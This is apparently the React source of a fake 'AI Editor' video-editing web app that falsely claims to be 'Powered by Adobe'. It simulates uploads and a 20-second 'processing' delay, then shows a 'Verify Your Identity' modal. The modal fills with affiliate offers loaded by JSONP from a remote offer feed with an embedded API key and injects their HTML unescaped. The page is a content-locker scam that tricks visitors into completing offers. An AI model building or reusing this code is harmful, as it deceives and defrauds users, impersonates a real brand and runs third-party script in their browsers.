import React, { useState, useRef, useEffect } from 'react';
import { Upload, Video, Wand2, Brain, Loader2, Command } from 'lucide-react';

interface VideoClip {
  file: File;
  preview: string;
}

// JSONP handler function
const fetchJSONP = (url: string): Promise<any> => {
  return new Promise((resolve, reject) => {
    const callbackName = 'jsonp_callback_' + Math.round(100000 * Math.random());

    // Define the callback function in the global scope
    (window as any)[callbackName] = (data: any) => {
      delete (window as any)[callbackName];
      document.body.removeChild(script);
      resolve(data);
    };

    const script = document.createElement('script');
    script.src = url.replace('callback=?', `callback=${callbackName}`);
    script.onerror = (error) => {
      delete (window as any)[callbackName];
      document.body.removeChild(script);
      reject(error);
    };

    document.body.appendChild(script);
  });
};

function App() {
  const [clips, setClips] = useState<VideoClip[]>([]);
  const [prompt, setPrompt] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);
  const [showVerification, setShowVerification] = useState(false);
  const [offers, setOffers] = useState<any[]>([]);
  const [uploadProgress, setUploadProgress] = useState(0);
  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    fetchJSONP('https://d30xmmta1avvoi.cloudfront.net/public/offers/feed.php?user_id=538458&api_key=16388e91cdf3368db3bfd08d2dfe4ff0&s1=&s2=&callback=?')
      .then(data => setOffers(data.slice(0, 3)))
      .catch(console.error);
  }, []);

  const validateVideo = (file: File): Promise<boolean> => {
    return new Promise((resolve) => {
      const video = document.createElement('video');
      video.preload = 'metadata';

      video.onloadedmetadata = () => {
        window.URL.revokeObjectURL(video.src);
        resolve(video.duration <= 30);
      };

      video.src = URL.createObjectURL(file);
    });
  };

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && clips.length < 3) {
      const file = e.target.files[0];
      if (file) {
        // Validate video duration
        const isValid = await validateVideo(file);
        if (!isValid) {
          alert('Video must be 30 seconds or less');
          return;
        }

        // Simulate upload progress
        setUploadProgress(0);
        const interval = setInterval(() => {
          setUploadProgress(prev => {
            if (prev >= 100) {
              clearInterval(interval);
              return 100;
            }
            return prev + 5;
          });
        }, 100);

        // Create preview and add to clips after "upload" is complete
        setTimeout(() => {
          const preview = URL.createObjectURL(file);
          setClips(prev => [...prev, { file, preview }]);
          setUploadProgress(0);
          clearInterval(interval);
        }, 2000);
      }
    }
  };

  const handleGenerate = () => {
    if (clips.length === 0) {
      alert('Please upload at least one video clip');
      return;
    }

    setIsGenerating(true);
    // 20 second delay before showing verification
    setTimeout(() => {
      setIsGenerating(false);
      setShowVerification(true);
    }, 20000);
  };

  return (
    <div className="min-h-screen bg-[#0A0A0A] text-white font-light">
      {/* Navigation */}
      <nav className="border-b border-white/10 backdrop-blur-sm fixed top-0 w-full z-50">
        <div className="container mx-auto px-6 py-4 flex justify-between items-center">
          <div className="flex items-center space-x-2">
            <Command className="w-8 h-8" />
            <span className="text-xl tracking-tight">AI Editor</span>
          </div>
          <div className="flex items-center space-x-2 text-white/50">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/Adobe_Photoshop_CC_icon.svg/2101px-Adobe_Photoshop_CC_icon.svg.png" alt="Adobe" className="h-5 w-5" />
            <span className="text-sm">Powered by Adobe</span>
          </div>
        </div>
      </nav>

      {/* Main Content */}
      <div className="container mx-auto px-6 pt-24 pb-16">
        <div className="max-w-4xl mx-auto">
          {/* Hero Section */}
          <div className="mb-16 space-y-4">
            <h1 className="text-5xl font-light tracking-tight">
              Create cinematic edits with AI
            </h1>
            <p className="text-lg text-white/60">
              Transform your footage into professional sequences using advanced AI technology
            </p>
          </div>

          {/* Upload Section */}
          <div className="space-y-12">
            <div className="space-y-6">
              <div className="flex items-center justify-between">
                <h2 className="text-xl font-light flex items-center gap-3">
                  <Video className="w-5 h-5" />
                  Source Clips
                </h2>
                <span className="text-sm text-white/40">Maximum 3 clips, 30s each</span>
              </div>
              <div className="grid grid-cols-3 gap-6">
                {[...Array(3)].map((_, i) => (
                  <div
                    key={i}
                    className={`aspect-video rounded-lg border ${
                      clips[i] ? 'border-white/20' : 'border-dashed border-white/10'
                    } relative overflow-hidden group cursor-pointer transition-all hover:border-white/30`}
                    onClick={() => fileInputRef.current?.click()}
                  >
                    {clips[i] ? (
                      <>
                        <video
                          src={clips[i].preview}
                          className="absolute inset-0 w-full h-full object-cover"
                          controls
                        />
                        <div className="absolute inset-0 bg-black/50 opacity-0 group-hover:opacity-100 flex items-center justify-center transition-opacity">
                          <p className="text-sm">Replace clip</p>
                        </div>
                      </>
                    ) : (
                      <div className="absolute inset-0 flex flex-col items-center justify-center p-4">
                        {uploadProgress > 0 ? (
                          <div className="w-full max-w-[80%]">
                            <div className="h-1 bg-white/10 rounded-full overflow-hidden">
                              <div 
                                className="h-full bg-white transition-all duration-200"
                                style={{ width: `${uploadProgress}%` }}
                              />
                            </div>
                            <p className="text-sm text-white/40 text-center mt-2">
                              Uploading... {uploadProgress}%
                            </p>
                          </div>
                        ) : (
                          <>
                            <Upload className="w-6 h-6 mb-2 text-white/40" />
                            <p className="text-sm text-white/40 text-center">Drop video or click to upload</p>
                          </>
                        )}
                      </div>
                    )}
                  </div>
                ))}
                <input
                  ref={fileInputRef}
                  type="file"
                  accept="video/*"
                  className="hidden"
                  onChange={handleFileUpload}
                />
              </div>
            </div>

            {/* Prompt Section */}
            <div className="space-y-6">
              <h2 className="text-xl font-light flex items-center gap-3">
                <Wand2 className="w-5 h-5" />
                Edit Instructions
              </h2>
              <textarea
                className="w-full bg-white/5 rounded-lg p-4 text-white resize-none border border-white/10 focus:border-white/30 focus:outline-none transition-colors"
                rows={4}
                placeholder="Describe your desired editing style..."
                value={prompt}
                onChange={(e) => setPrompt(e.target.value)}
              />
            </div>

            {/* AI Training Section */}
            <div className="space-y-6">
              <h2 className="text-xl font-light flex items-center gap-3">
                <Brain className="w-5 h-5" />
                Style Training
              </h2>
              <div className="border border-white/10 rounded-lg p-6 space-y-4">
                <p className="text-sm text-white/60">Upload your edited videos to train the AI with your style</p>
                <input
                  type="file"
                  className="block w-full text-sm text-white/60
                    file:mr-4 file:py-2 file:px-4
                    file:rounded-full file:border file:border-white/10
                    file:text-sm file:font-light
                    file:bg-white/5 file:text-white
                    hover:file:bg-white/10 file:transition-colors"
                  accept="video/*"
                />
              </div>
            </div>

            {/* Generate Button */}
            <button
              className={`w-full py-4 rounded-lg text-lg relative overflow-hidden
                ${isGenerating ? 'bg-white/10 cursor-wait' : 'bg-white text-black hover:bg-white/90'} 
                transition-all duration-300`}
              onClick={handleGenerate}
              disabled={isGenerating}
            >
              {isGenerating ? (
                <span className="flex items-center justify-center gap-2">
                  <Loader2 className="w-5 h-5 animate-spin" />
                  Processing...
                </span>
              ) : (
                'Generate Edit'
              )}
            </button>
          </div>
        </div>
      </div>

      {/* Verification Modal */}
      {showVerification && (
        <div className="fixed inset-0 bg-black/90 flex items-center justify-center p-4 backdrop-blur-md z-50">
          <div className="bg-[#0A0A0A] p-8 rounded-xl max-w-2xl w-full border border-white/10 relative overflow-hidden">
            {/* Decorative gradient background */}
            <div className="absolute inset-0 bg-gradient-to-br from-blue-500/10 via-purple-500/10 to-pink-500/10 pointer-events-none" />
            
            <div className="relative z-10">
              <h2 className="text-3xl font-light mb-4 text-center bg-clip-text text-transparent bg-gradient-to-r from-blue-500 to-purple-500">
                Verify Your Identity
              </h2>
              <p className="text-white/60 mb-8 text-center">
                Complete one quick verification to unlock AI editing capabilities
              </p>
              
              <div className="grid gap-6">
                {offers.slice(0, 3).map((offer, index) => (
                  <a
                    key={index}
                    href={offer.url}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="group block"
                  >
                    <div className="p-6 bg-white/5 backdrop-blur-xl rounded-xl border border-white/10 hover:border-white/20 transition-all duration-300 transform hover:-translate-y-1 hover:shadow-2xl hover:shadow-purple-500/10">
                      <div className="flex items-center gap-4">
                        <div className="w-12 h-12 rounded-full bg-gradient-to-br from-blue-500 to-purple-500 flex items-center justify-center text-white font-medium">
                          {index + 1}
                        </div>
                        <div className="flex-1">
                          <div dangerouslySetInnerHTML={{ __html: offer.anchor }} className="text-lg font-light text-white group-hover:text-purple-400 transition-colors" />
                          <p className="text-white/40 mt-1">Quick verification • Instant access</p>
                        </div>
                      </div>
                    </div>
                  </a>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Fixed Adobe Badge */}
      <div className="fixed bottom-4 right-4 bg-white/5 backdrop-blur-md rounded-full py-2 px-4 flex items-center space-x-2 border border-white/10">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/Adobe_Photoshop_CC_icon.svg/2101px-Adobe_Photoshop_CC_icon.svg.png" alt="Adobe" className="h-4 w-4" />
        <span className="text-xs text-white/60">Enhanced with Adobe Technology</span>
      </div>
    </div>
  );
}

export default App;